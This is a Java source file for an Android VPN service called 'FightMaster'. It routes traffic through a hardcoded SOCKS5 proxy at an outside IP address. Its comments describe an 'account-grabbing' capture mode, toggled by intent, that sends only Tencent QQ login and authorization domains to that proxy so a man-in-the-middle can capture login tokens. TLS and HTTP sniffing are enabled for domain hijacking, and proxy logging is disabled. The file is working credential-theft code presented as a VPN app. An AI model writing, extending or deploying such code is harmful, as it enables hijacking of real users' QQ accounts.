package com.fightmaster.vpn;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.nio.charset.StandardCharsets;

import tun2socks.Tun2socks;

/**
 * FightMaster VPN 服务
 * 硬编码 SOCKS5 代理配置，通过 tun2socks + v2ray-core 建立 VPN 隧道
 */
public class FightMasterVpnService extends VpnService implements tun2socks.VpnService {

    private static final String TAG = "FightMasterVPN";
    private static final String CHANNEL_ID = "fightmaster_vpn";

    // 代理服务器配置
    public static final String PROXY_HOST = "38.22.234.228";
    public static final int PROXY_PORT = 9900;

    private ParcelFileDescriptor pfd;
    private Thread bgThread;
    private volatile boolean running = false;
    private int tunFd = -1;

    // 抓号模式：QQ auth 域名走代理（MITM），其余 QQ 域名直连
    private boolean captureMode = false;

    // 静态实例引用，供 CommandReceiver 调用
    private static FightMasterVpnService instance;

    public static FightMasterVpnService getInstance() {
        return instance;
    }

    /**
     * 动态构建 v2ray 配置
     * 普通模式：所有 QQ/腾讯域名直连
     * 抓号模式：QQ auth 域名走代理（MITM 捕获 token），其余 QQ 域名仍直连
     */
    private String buildV2RayConfig() {
        String qqRule;
        if (captureMode) {
            // 抓号模式：auth 域名先匹配走代理，其余 QQ 域名直连
            qqRule = "{\"type\":\"field\",\"domain\":[\"full:ssl.ptlogin2.qq.com\",\"full:xui.ptlogin2.qq.com\",\"full:graph.qq.com\",\"full:auth.qq.com\"],\"outboundTag\":\"proxy\"},"
                   + "{\"type\":\"field\",\"domain\":[\"domain:qq.com\",\"domain:tencent.com\",\"domain:wechat.com\",\"domain:weixin.qq.com\",\"domain:gtimg.cn\",\"domain:qpic.cn\",\"domain:idqqimg.com\",\"domain:qlogo.cn\",\"domain:myqcloud.com\"],\"outboundTag\":\"direct\"},";
        } else {
            // 普通模式：所有 QQ/腾讯域名直连
            qqRule = "{\"type\":\"field\",\"domain\":[\"domain:qq.com\",\"domain:tencent.com\",\"domain:wechat.com\",\"domain:weixin.qq.com\",\"domain:gtimg.cn\",\"domain:qpic.cn\",\"domain:idqqimg.com\",\"domain:qlogo.cn\",\"domain:myqcloud.com\"],\"outboundTag\":\"direct\"},";
        }

        return "{"
            + "\"log\":{\"loglevel\":\"warning\"},"
            + "\"dns\":{\"hosts\":{\"gameproxy-verify\":\"1.2.3.4\"},\"servers\":[\"223.5.5.5\",\"8.8.8.8\"]},"
            + "\"outbound\":{\"protocol\":\"socks\",\"settings\":{\"servers\":[{\"address\":\"" + PROXY_HOST + "\",\"port\":" + PROXY_PORT + "}]},\"streamSettings\":{\"network\":\"tcp\"},\"tag\":\"proxy\"},"
            + "\"outboundDetour\":["
            +   "{\"protocol\":\"freedom\",\"settings\":{},\"tag\":\"direct\"},"
            +   "{\"protocol\":\"dns\",\"settings\":{},\"tag\":\"dns-out\"}"
            + "],"
            + "\"routing\":{\"settings\":{\"domainStrategy\":\"IPOnDemand\",\"rules\":["
            +   "{\"type\":\"field\",\"port\":\"53\",\"outboundTag\":\"dns-out\"},"
            +   qqRule
            +   "{\"type\":\"field\",\"ip\":[\"120.204.207.84\",\"101.226.94.67\",\"101.226.96.203\",\"116.128.169.94\",\"58.246.163.95\",\"221.181.98.213\",\"183.192.196.121\",\"116.128.169.68\",\"101.226.101.163\"],\"outboundTag\":\"direct\"},"
            +   "{\"type\":\"field\",\"domain\":[\"domain:googleapis.com\",\"domain:google.com\",\"domain:gstatic.com\"],\"outboundTag\":\"direct\"},"
            +   "{\"type\":\"field\",\"outboundTag\":\"proxy\",\"port\":\"0-65535\"}"
            + "]}}"
            + "}";
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.i(TAG, "Service created");
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopVpn();
            return START_NOT_STICKY;
        }

        // 抓号模式切换（通过 Intent action）
        if (intent != null && "CAPTURE_ON".equals(intent.getAction())) {
            setCaptureMode(true);
            return START_STICKY;
        }
        if (intent != null && "CAPTURE_OFF".equals(intent.getAction())) {
            setCaptureMode(false);
            return START_STICKY;
        }

        if (running) {
            Log.w(TAG, "Already running, stopping first");
            stopVpnInternal();
        }

        startForegroundNotification();
        startVpn();
        return START_STICKY;
    }

    private void startVpn() {
        bgThread = new Thread(() -> {
            try {
                // 1. 建立 TUN 设备
                Builder builder = new Builder();
                builder.setSession("FightMaster")
                       .addAddress("26.26.26.1", 30)
                       .addRoute("0.0.0.0", 0)
                       .addDnsServer("223.5.5.5")
                       .addDnsServer("8.8.8.8")
                       .setMtu(1500);

                // 分应用代理 — 从用户选择读取
                java.util.Set<String> allowedApps = AppSelectActivity.getSelectedApps(this);
                Log.i(TAG, "Per-app VPN: " + allowedApps.size() + " apps selected");
                for (String pkg : allowedApps) {
                    try {
                        builder.addAllowedApplication(pkg);
                        Log.d(TAG, "  allowed: " + pkg);
                    } catch (Exception e) {
                        Log.w(TAG, "App not found: " + pkg);
                    }
                }

                pfd = builder.establish();
                if (pfd == null) {
                    Log.e(TAG, "Failed to establish VPN");
                    sendStatus("error", "VPN establish failed");
                    return;
                }

                // 2. 设置本地 DNS
                Tun2socks.setLocalDNS("223.5.5.5:53");

                // 3. 启动 v2ray
                tunFd = pfd.detachFd();
                byte[] configBytes = buildV2RayConfig().getBytes(StandardCharsets.UTF_8);
                String filesDir = getFilesDir().getAbsolutePath();

                long ret = Tun2socks.startV2Ray(
                        tunFd,          // TUN fd
                        this,           // VpnService (protect)
                        new NoOpDBService(), // DBService (日志，不需要)
                        configBytes,    // v2ray config
                        "proxy",        // outbound tag
                        "http,tls",     // sniffings — 还原域名，让代理能做域名劫持和规则匹配
                        filesDir,       // files dir
                        false,          // fake dns
                        false,          // stats
                        filesDir        // assets dir
                );

                if (ret != 0) {
                    Log.e(TAG, "startV2Ray failed, code=" + ret);
                    sendStatus("error", "V2Ray start failed: " + ret);
                    return;
                }

                running = true;
                Log.i(TAG, "VPN started successfully");
                sendStatus("connected", PROXY_HOST + ":" + PROXY_PORT);

            } catch (Exception e) {
                Log.e(TAG, "VPN start error", e);
                sendStatus("error", e.getMessage());
            }
        });
        bgThread.start();
    }

    /** 清理 VPN 资源，不触发 UI/Service 生命周期 */
    private void stopVpnInternal() {
        running = false;

        // 1. 停止 v2ray
        try {
            Tun2socks.stopV2Ray();
        } catch (Exception e) {
            Log.w(TAG, "stopV2Ray error", e);
        }

        // 2. 等待后台线程结束
        if (bgThread != null && bgThread.isAlive()) {
            try {
                bgThread.join(3000);
            } catch (InterruptedException ignored) {}
            bgThread = null;
        }

        // 3. 关闭 TUN fd
        if (tunFd >= 0) {
            try {
                ParcelFileDescriptor.adoptFd(tunFd).close();
            } catch (Exception e) {
                Log.w(TAG, "close tunFd error", e);
            }
            tunFd = -1;
        }

        // 4. 关闭 pfd（如果还没 detach）
        if (pfd != null) {
            try {
                pfd.close();
            } catch (Exception e) {
                Log.w(TAG, "close pfd error", e);
            }
            pfd = null;
        }

        Log.i(TAG, "VPN internal cleanup done");
    }

    public void stopVpn() {
        stopVpnInternal();
        sendStatus("disconnected", "");
        stopForeground(true);
        stopSelf();
        Log.i(TAG, "VPN stopped");
    }

    // tun2socks.VpnService 接口
    @Override
    public boolean protect(long fd) {
        return protect((int) fd);
    }

    @Override
    public void didStop() {
        stopVpn();
    }

    @Override
    public void onRevoke() {
        stopVpn();
    }

    @Override
    public void onDestroy() {
        instance = null;
        stopVpn();
        super.onDestroy();
    }

    /**
     * 切换抓号模式。如果 VPN 正在运行，热重启 v2ray 使配置生效。
     */
    public void setCaptureMode(boolean enabled) {
        this.captureMode = enabled;
        Log.i(TAG, "Capture mode: " + (enabled ? "ON" : "OFF"));
        // 不在运行时重启 VPN，仅设置标志位
        // 下次 VPN 启动时会使用新配置
        // 如果需要立即生效，外部应先 STOP 再 START
    }

    private void sendStatus(String status, String detail) {
        Intent i = new Intent("com.fightmaster.vpn.VPN_STATUS");
        i.putExtra("status", status);
        i.putExtra("detail", detail);
        sendBroadcast(i);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "FightMaster VPN", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("VPN 运行状态");
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private void startForegroundNotification() {
        Notification.Builder nb;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nb = new Notification.Builder(this, CHANNEL_ID);
        } else {
            nb = new Notification.Builder(this);
        }
        nb.setContentTitle("FightMaster")
          .setContentText("VPN 运行中")
          .setSmallIcon(android.R.drawable.ic_lock_lock)
          .setOngoing(true);
        startForeground(1, nb.build());
    }

    public static boolean isRunning() {
        // 简单标记，实际可用绑定方式
        return false;
    }

    // 空实现的 DBService
    private static class NoOpDBService implements tun2socks.DBService {
        @Override
        public void insertProxyLog(String target, String tag, long start, long elapsed,
                                   int sent, int received, int protocol, int logType,
                                   String uid, String extra, int status) {
            // 不记录日志
        }
    }
}
